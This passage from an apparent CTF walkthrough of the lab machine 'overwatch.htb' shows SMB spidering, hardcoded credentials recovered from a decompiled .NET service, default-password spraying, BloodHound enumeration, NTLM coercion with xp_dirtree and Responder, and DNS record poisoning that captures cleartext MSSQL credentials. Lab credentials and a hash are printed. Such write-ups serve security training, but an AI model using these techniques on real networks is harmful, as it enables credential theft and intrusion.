+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span>     STATS_FLAG: True
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> EXCLUDE_FILTER: <span class="o">[</span><span class="s1">'print$'</span>, <span class="s1">'ipc$'</span><span class="o">]</span>
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span>   EXCLUDE_EXTS: <span class="o">[</span><span class="s1">'ico'</span>, <span class="s1">'lnk'</span><span class="o">]</span>
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span>  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span>  OUTPUT_FOLDER: /home/tralsesec/.nxc/modules/nxc_spider_plus
+SMB         10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerated shares
+SMB         10.129.50.147   445    S200401          Share           Permissions     Remark
+SMB         10.129.50.147   445    S200401          <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.129.50.147   445    S200401          ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.129.50.147   445    S200401          C<span class="nv">$ </span>                             Default share
+SMB         10.129.50.147   445    S200401          IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.129.50.147   445    S200401          NETLOGON                        Logon server share
+SMB         10.129.50.147   445    S200401          software<span class="nv">$ </span>      READ
+SMB         10.129.50.147   445    S200401          SYSVOL                          Logon server share
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span>+] Saved share-file metadata to <span class="s2">"/home/tralsesec/.nxc/modules/nxc_spider_plus/10.129.50.147.json"</span><span class="nb">.</span>
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> SMB Shares:           6 <span class="o">(</span>ADMIN<span class="nv">$,</span> C<span class="nv">$,</span> IPC<span class="nv">$,</span> NETLOGON, software<span class="nv">$,</span> SYSVOL<span class="o">)</span>
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> SMB Readable Shares:  2 <span class="o">(</span>IPC<span class="nv">$,</span> software<span class="nv">$)</span>
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> SMB Filtered Shares:  1
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Total folders found:  3
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Total files found:    16
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Files filtered:       12
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> File size average:    1.36 MB
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> File size min:        2.11 KB
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> File size max:        6.81 MB
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> File unique exts:     5 <span class="o">(</span>xml, exe, config, dll, pdb<span class="o">)</span>
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloads successful: 4
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span>+] All files processed successfully.
+</code></pre></div></div>
+
+<p>Let’s check out the folder <code class="language-plaintext highlighter-rouge">~/.nxc/modules/nxc_spider_plus/$IP/</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> ~/.nxc/modules/nxc_spider_plus/<span class="nv">$IP</span>/
+<span class="s1">'software$'</span>
+
+<span class="nv">$ </span><span class="nb">ls</span> ~/.nxc/modules/nxc_spider_plus/<span class="nv">$IP</span>/<span class="k">*</span>
+Monitoring
+
+<span class="nv">$ </span><span class="nb">ls</span> ~/.nxc/modules/nxc_spider_plus/<span class="nv">$IP</span>/<span class="k">*</span>/Monitoring
+Microsoft.Management.Infrastructure.dll  overwatch.exe	overwatch.exe.config  overwatch.pdb
+
+<span class="nv">$ </span><span class="nb">cat</span> ~/.nxc/modules/nxc_spider_plus/<span class="nv">$IP</span>/<span class="k">*</span>/<span class="k">*</span>/overwatch.exe.config
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;
+&lt;configuration&gt;
+  &lt;configSections&gt;
+    &lt;<span class="o">!</span><span class="nt">--</span> For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID<span class="o">=</span>237468 <span class="nt">--</span><span class="o">&gt;</span>
+    &lt;section <span class="nv">name</span><span class="o">=</span><span class="s2">"entityFramework"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"</span> <span class="nv">requirePermission</span><span class="o">=</span><span class="s2">"false"</span> /&gt;
+  &lt;/configSections&gt;
+  &lt;system.serviceModel&gt;
+    &lt;services&gt;
+      &lt;service <span class="nv">name</span><span class="o">=</span><span class="s2">"MonitoringService"</span><span class="o">&gt;</span>
+        &lt;host&gt;
+          &lt;baseAddresses&gt;
+            &lt;add <span class="nv">baseAddress</span><span class="o">=</span><span class="s2">"http://overwatch.htb:8000/MonitorService"</span> /&gt;
+          &lt;/baseAddresses&gt;
+        &lt;/host&gt;
+        &lt;endpoint <span class="nv">address</span><span class="o">=</span><span class="s2">""</span> <span class="nv">binding</span><span class="o">=</span><span class="s2">"basicHttpBinding"</span> <span class="nv">contract</span><span class="o">=</span><span class="s2">"IMonitoringService"</span> /&gt;
+        &lt;endpoint <span class="nv">address</span><span class="o">=</span><span class="s2">"mex"</span> <span class="nv">binding</span><span class="o">=</span><span class="s2">"mexHttpBinding"</span> <span class="nv">contract</span><span class="o">=</span><span class="s2">"IMetadataExchange"</span> /&gt;
+      &lt;/service&gt;
+      
+      &lt;SNIP&gt;
+      
+      &lt;provider <span class="nv">invariantName</span><span class="o">=</span><span class="s2">"System.Data.SqlClient"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer"</span> /&gt;
+      &lt;provider <span class="nv">invariantName</span><span class="o">=</span><span class="s2">"System.Data.SQLite.EF6"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6"</span> /&gt;
+
+      &lt;SNIP&gt;
+</code></pre></div></div>
+
+<p>Jackpot! The service runs on <code class="language-plaintext highlighter-rouge">http://overwatch.htb:8000/MonitorService</code>. As we didn’t find port <code class="language-plaintext highlighter-rouge">8000</code> open in the nmap scan before this is very likely an internal service. AND it tells us <code class="language-plaintext highlighter-rouge">&lt;endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" /&gt;</code> meaning the endpoint will leak all callable methods.</p>
+
+<p>Let’s try to connect:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-I</span> http://<span class="nv">$IP</span>:8000/MonitorService
+
+&lt;nothing&gt;
+</code></pre></div></div>
+
+<p>As we can’t connect, we must reverse engineer the <code class="language-plaintext highlighter-rouge">.exe</code> file. I suspect this will be a <code class="language-plaintext highlighter-rouge">.NET</code> application, let’s check it out:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file overwatch.exe
+overwatch.exe: PE32+ executable <span class="k">for </span>MS Windows 6.00 <span class="o">(</span>console<span class="o">)</span>, x86-64 Mono/.Net assembly, 2 sections
+</code></pre></div></div>
+
+<p>Indeed. We can reverse engineer it easily with <code class="language-plaintext highlighter-rouge">dnSpy</code>.</p>
+
+<h3 id="service-mssql">Service: MSSQL</h3>
+
+<p>Unusual port <code class="language-plaintext highlighter-rouge">6520</code> for <code class="language-plaintext highlighter-rouge">ms-sql-s</code> (usually on port <code class="language-plaintext highlighter-rouge">1433</code>).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Test 1: no password (with --local-auth)</span>
+<span class="c"># Test 2: Standard Passwords.</span>
+<span class="nv">$ </span>nxc mssql <span class="nv">$IP</span> <span class="nt">-u</span> <span class="s1">'sa'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--local-auth</span> <span class="nt">--port</span> 6520 <span class="p">;</span> <span class="se">\</span>
+  nxc mssql <span class="nv">$IP</span> <span class="nt">-u</span> <span class="s1">'sa'</span> <span class="nt">-p</span> <span class="s1">'sa'</span> <span class="nt">--local-auth</span> <span class="nt">--port</span> 6520 <span class="p">;</span> <span class="se">\</span>
+  nxc mssql <span class="nv">$IP</span> <span class="nt">-u</span> <span class="s1">'sa'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--local-auth</span> <span class="nt">--port</span> 6520
+
+MSSQL       10.129.50.147   6520   S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span> <span class="o">(</span>EncryptionReq:False<span class="o">)</span>
+MSSQL       10.129.50.147   6520   S200401          <span class="o">[</span>-] S200401<span class="se">\s</span>a: <span class="o">(</span>Login failed <span class="k">for </span>user <span class="s1">'sa'</span><span class="nb">.</span> Please try again with or without <span class="s1">'--local-auth'</span><span class="o">)</span>
+MSSQL       10.129.50.147   6520   S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span> <span class="o">(</span>EncryptionReq:False<span class="o">)</span>
+MSSQL       10.129.50.147   6520   S200401          <span class="o">[</span>-] S200401<span class="se">\s</span>a:sa <span class="o">(</span>Login failed <span class="k">for </span>user <span class="s1">'sa'</span><span class="nb">.</span> Please try again with or without <span class="s1">'--local-auth'</span><span class="o">)</span>
+MSSQL       10.129.50.147   6520   S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span> <span class="o">(</span>EncryptionReq:False<span class="o">)</span>
+MSSQL       10.129.50.147   6520   S200401          <span class="o">[</span>-] S200401<span class="se">\s</span>a:password <span class="o">(</span>Login failed <span class="k">for </span>user <span class="s1">'sa'</span><span class="nb">.</span> Please try again with or without <span class="s1">'--local-auth'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>Again, nothing.</p>
+
+<h3 id="service-port-8000-overwatchexe">Service: Port 8000 (<code class="language-plaintext highlighter-rouge">overwatch.exe</code>)</h3>
+
+<p>After decompiling the <code class="language-plaintext highlighter-rouge">overwatch.exe</code> executable, we find the following function:</p>
+<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">private</span> <span class="k">readonly</span> <span class="kt">string</span> <span class="n">connectionString</span> <span class="p">=</span> <span class="s">"Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"</span><span class="p">;</span>
+        <span class="kt">string</span> <span class="n">historyPath</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="nf">GetFolderPath</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">SpecialFolder</span><span class="p">.</span><span class="n">LocalApplicationData</span><span class="p">),</span> <span class="s">"Microsoft\\Edge\\User Data\\Default\\History"</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(!</span><span class="n">File</span><span class="p">.</span><span class="nf">Exists</span><span class="p">(</span><span class="n">historyPath</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="kt">string</span> <span class="n">tempPath</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">GetTempFileName</span><span class="p">();</span>
+        <span class="n">File</span><span class="p">.</span><span class="nf">Copy</span><span class="p">(</span><span class="n">historyPath</span><span class="p">,</span> <span class="n">tempPath</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+        <span class="k">try</span>
+        <span class="p">{</span>
+            <span class="k">using</span> <span class="p">(</span><span class="n">SqlConnection</span> <span class="n">conn</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SqlConnection</span><span class="p">(</span><span class="s">"Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">conn</span><span class="p">.</span><span class="nf">Open</span><span class="p">();</span>
+                <span class="k">using</span> <span class="p">(</span><span class="n">SqlCommand</span> <span class="n">command</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SqlCommand</span><span class="p">())</span>
+                <span class="p">{</span>
+                    <span class="n">command</span><span class="p">.</span><span class="n">Connection</span> <span class="p">=</span> <span class="n">conn</span><span class="p">;</span>
+                    <span class="n">SQLiteConnection</span> <span class="n">reader</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SQLiteConnection</span><span class="p">(</span><span class="s">"Data Source="</span> <span class="p">+</span> <span class="n">tempPath</span> <span class="p">+</span> <span class="s">";Version=3;"</span><span class="p">);</span>
+                    <span class="n">reader</span><span class="p">.</span><span class="nf">Open</span><span class="p">();</span>
+                    <span class="n">SQLiteDataReader</span> <span class="n">r</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SQLiteCommand</span><span class="p">(</span><span class="s">"SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5"</span><span class="p">,</span> <span class="n">reader</span><span class="p">).</span><span class="nf">ExecuteReader</span><span class="p">();</span>
+                    <span class="k">while</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">Read</span><span class="p">())</span>
+                    <span class="p">{</span>
+                        <span class="kt">string</span> <span class="n">url</span> <span class="p">=</span> <span class="n">r</span><span class="p">[</span><span class="s">"url"</span><span class="p">].</span><span class="nf">ToString</span><span class="p">();</span>
+                        <span class="kt">string</span> <span class="n">sql</span> <span class="p">=</span> <span class="s">"INSERT INTO EventLog (Timestamp, EventType, Details) VALUES (GETDATE(), 'URLVisit', '"</span> <span class="p">+</span> <span class="n">url</span> <span class="p">+</span> <span class="s">"')"</span><span class="p">;</span>
+                        <span class="n">command</span><span class="p">.</span><span class="n">CommandText</span> <span class="p">=</span> <span class="n">sql</span><span class="p">;</span>
+                        <span class="n">command</span><span class="p">.</span><span class="nf">ExecuteNonQuery</span><span class="p">();</span>
+                    <span class="p">}</span>
+                    <span class="n">reader</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+</code></pre></div></div>
+
+<p>-&gt; <code class="language-plaintext highlighter-rouge">Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv</code></p>
+
+<p>Found credentials: <code class="language-plaintext highlighter-rouge">sqlsvc</code> / <code class="language-plaintext highlighter-rouge">TI0LKcfHzZw1Vv</code></p>
+
+<p>To verify:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nxc smb <span class="nv">$IP</span> <span class="nt">-u</span> sqlsvc <span class="nt">-p</span> TI0LKcfHzZw1Vv
+SMB         10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          <span class="o">[</span>+] overwatch.htb<span class="se">\s</span>qlsvc:TI0LKcfHzZw1Vv
+</code></pre></div></div>
+
+<p>Here we go.</p>
+
+<p>Let’s set these as variables:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ USER</span><span class="o">=</span><span class="s1">'sqlsvc'</span> <span class="p">;</span> <span class="nv">PASS</span><span class="o">=</span><span class="s1">'TI0LKcfHzZw1Vv'</span>
+</code></pre></div></div>
+
+<h3 id="bloodhound">Bloodhound</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>bloodhound-python <span class="nt">-d</span> <span class="nv">$DOMAIN</span> <span class="nt">-u</span> <span class="nv">$USER</span> <span class="nt">-p</span> <span class="nv">$PASS</span> <span class="nt">-c</span> All <span class="nt">--zip</span> <span class="nt">-ns</span> <span class="nv">$IP</span>
+INFO: BloodHound.py <span class="k">for </span>BloodHound LEGACY <span class="o">(</span>BloodHound 4.2 and 4.3<span class="o">)</span>
+INFO: Found AD domain: overwatch.htb
+INFO: Getting TGT <span class="k">for </span>user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="o">[</span>Errno Connection error <span class="o">(</span>s200401.overwatch.htb:88<span class="o">)]</span> <span class="o">[</span>Errno <span class="nt">-2</span><span class="o">]</span> Name or service not known
+INFO: Connecting to LDAP server: s200401.overwatch.htb
+INFO: Testing resolved <span class="nb">hostname </span>connectivity dead:beef::536a:e0df:acdd:fee3
+INFO: Trying LDAP connection to dead:beef::536a:e0df:acdd:fee3
+INFO: Testing resolved <span class="nb">hostname </span>connectivity dead:beef::18f
+INFO: Trying LDAP connection to dead:beef::18f
+INFO: Found 1 domains
+INFO: Found 1 domains <span class="k">in </span>the forest
+INFO: Found 6 computers
+INFO: Connecting to LDAP server: s200401.overwatch.htb
+INFO: Testing resolved <span class="nb">hostname </span>connectivity dead:beef::536a:e0df:acdd:fee3
+INFO: Trying LDAP connection to dead:beef::536a:e0df:acdd:fee3
+INFO: Testing resolved <span class="nb">hostname </span>connectivity dead:beef::18f
+INFO: Trying LDAP connection to dead:beef::18f
+INFO: Found 106 <span class="nb">users
+</span>INFO: Found 54 <span class="nb">groups
+</span>INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer: S200401.overwatch.htb
+INFO: Done <span class="k">in </span>00M 05S
+INFO: Compressing output into 20260508230956_bloodhound.zip
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-2-initial-foothold">🚪 2. Initial Foothold</h2>
+
+<p>Using <code class="language-plaintext highlighter-rouge">sqlsvc</code> credentials:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-mssqlclient <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> <span class="nt">-windows-auth</span> <span class="nt">-port</span> 6520
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+Password:&lt;<span class="nb">type </span><span class="k">in </span>password: TI0LKcfHzZw1Vv&gt;
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>S200401<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>S200401<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server 2022 RTM <span class="o">(</span>16.0.1000<span class="o">)</span>
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL <span class="o">(</span>OVERWATCH<span class="se">\s</span>qlsvc  guest@master<span class="o">)&gt;</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>OVERWATCH<span class="se">\s</span>qlsvc  dbo@overwatch<span class="o">)&gt;</span> SELECT <span class="k">*</span> FROM fn_my_permissions<span class="o">(</span>NULL, <span class="s1">'SERVER'</span><span class="o">)</span><span class="p">;</span>
+entity_name   subentity_name   permission_name
+<span class="nt">-----------</span>   <span class="nt">--------------</span>   <span class="nt">-----------------</span>
+server                         CONNECT SQL
+server                         VIEW ANY DATABASE
+
+SQL <span class="o">(</span>OVERWATCH<span class="se">\s</span>qlsvc  dbo@overwatch<span class="o">)&gt;</span> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id <span class="o">=</span> b.sid WHERE a.permission_name <span class="o">=</span> <span class="s1">'IMPERSONATE'</span><span class="p">;</span>
+name
+<span class="nt">----</span>
+
+SQL <span class="o">(</span>OVERWATCH<span class="se">\s</span>qlsvc  dbo@overwatch<span class="o">)&gt;</span> SELECT table_name FROM information_schema.tables WHERE table_type <span class="o">=</span> <span class="s1">'BASE TABLE'</span><span class="p">;</span>
+table_name
+<span class="nt">----------</span>
+Eventlog
+
+SQL <span class="o">(</span>OVERWATCH<span class="se">\s</span>qlsvc  dbo@overwatch<span class="o">)&gt;</span> SELECT <span class="k">*</span> FROM EventLog<span class="p">;</span>
+Id   Timestamp   EventType   Details
+<span class="nt">--</span>   <span class="nt">---------</span>   <span class="nt">---------</span>   <span class="nt">-------</span>
+
+SQL <span class="o">(</span>OVERWATCH<span class="se">\s</span>qlsvc  dbo@overwatch<span class="o">)&gt;</span> SELECT a.name AS <span class="s1">'database'</span>, b.name AS <span class="s1">'owner'</span>, is_trustworthy_on FROM sys.databases a JOIN sys.server_principals b ON a.owner_sid <span class="o">=</span> b.sid<span class="p">;</span>
+database    owner              is_trustworthy_on
+<span class="nt">---------</span>   <span class="nt">----------------</span>   <span class="nt">-----------------</span>
+master      sa                                 0
+tempdb      sa                                 0
+model       sa                                 0
+msdb        sa                                 1
+overwatch   OVERWATCH<span class="se">\s</span>qlsvc                   0
+</code></pre></div></div>
+
+<p>Empty. Strange.</p>
+
+<p>Let’s capture the hash of the MSSQL server (computer account):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+&lt;SNIP&gt;
+
+<span class="o">[</span>+] Listening <span class="k">for </span>events...
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL (OVERWATCH\sqlsvc  dbo@overwatch)&gt; EXEC master.dbo.xp_dirtree '\\&lt;YOUR IP&gt;\share';
+subdirectory   depth
+------------   -----
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[!] Error starting TCP server on port 53, check permissions or other servers running.
+[SMB] NTLMv2-SSP Client   : &lt;IP&gt;
+[SMB] NTLMv2-SSP Username : OVERWATCH\S200401$
+[SMB] NTLMv2-SSP Hash     : S200401$::OVERWATCH:1d25b729872b51c2:F7EBA7DDE74E6F2DD6A85D44CDA21D07:0101000000000000007505B143DFDC01CE4FE5CB4A4012C40000000002000800560059003200360001001E00570049004E002D0042005A00300048004200350045005400530053004C0004003400570049004E002D0042005A00300048004200350045005400530053004C002E0056005900320036002E004C004F00430041004C000300140056005900320036002E004C004F00430041004C000500140056005900320036002E004C004F00430041004C0007000800007505B143DFDC0106000400020000000800300030000000000000000000000000300000585C37ED105FE6D5C0F72E0117CF12F5D0E8831E43918DB168CD1A319B14B5C90A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200350032000000000000000000
+</code></pre></div></div>
+
+<p>But that doesn’t really do much unfortunetaly as we can’t crack it (too complex) and SMB Signing is <code class="language-plaintext highlighter-rouge">True</code> as we found out earlier (so no relaying attacks).</p>
+
+<p>Let’s check for linked servers.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL (OVERWATCH\sqlsvc  guest@master)&gt; EXEC sp_linkedservers
+SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
+------------------   ----------------   -----------   ------------------   ------------------   ------------   -------
+S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL
+SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL
+</code></pre></div></div>
+
+<p>There’s a linked server called <code class="language-plaintext highlighter-rouge">SQL07</code>. Let’s try to hit it:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL (OVERWATCH\sqlsvc  guest@master)&gt; EXEC ('select @@servername') AT SQL07;
+INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
+INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
+ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64].
+</code></pre></div></div>
+
+<p>Great! The name <code class="language-plaintext highlighter-rouge">SQL07</code> could not be resolved. So if we as a domain user (<code class="language-plaintext highlighter-rouge">sqlsvc</code>) can add a DNS record - which all domain users can - then it will authenticate to us and send the credentials in cleartext (because it will authenticate MSSQL to MSSQL via cleartext credentials and not via NTLM). Then we’ll get new credentials!</p>
+
+<p>Let’s try it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 dnstool.py <span class="nt">-u</span> <span class="nv">$USER</span> <span class="nt">-p</span> <span class="nv">$PASS</span> <span class="nt">-r</span> SQL07 <span class="nt">-d</span> &lt;YOUR IP&gt; <span class="nt">--action</span> add <span class="nv">$IP</span>
+
+<span class="o">[</span>-] Connecting to host...
+<span class="o">[</span>-] Binding to host
+<span class="o">[</span>+] Bind OK
+<span class="o">[</span>-] Adding new record
+<span class="o">[</span>+] LDAP operation completed successfully
+</code></pre></div></div>
+
+<p>Great. Let’s now start responder and authenticate!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+&lt;SNIP&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL (OVERWATCH\sqlsvc  guest@master)&gt; EXEC ('select @@servername') AT SQL07;
+INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
+ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
+
+</code></pre></div></div>
+
+<p>And see in responder!!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>MSSQL] Cleartext Client   : <span class="nv">$IP</span>
+<span class="o">[</span>MSSQL] Cleartext Hostname : SQL07 <span class="o">()</span>
+<span class="o">[</span>MSSQL] Cleartext Username : sqlmgmt
+<span class="o">[</span>MSSQL] Cleartext Password : bIhBbzMMnB82yx
+</code></pre></div></div>
+
+<p>Here we go! <code class="language-plaintext highlighter-rouge">sqlmgmt</code> / <code class="language-plaintext highlighter-rouge">bIhBbzMMnB82yx</code>.</p>
+
+<p>Fortunetaly, the user <code class="language-plaintext highlighter-rouge">sqlmgmt</code> is member of <code class="language-plaintext highlighter-rouge">Remote Management Users</code> Group, so we should be able to login via <code class="language-plaintext highlighter-rouge">winrm</code>:
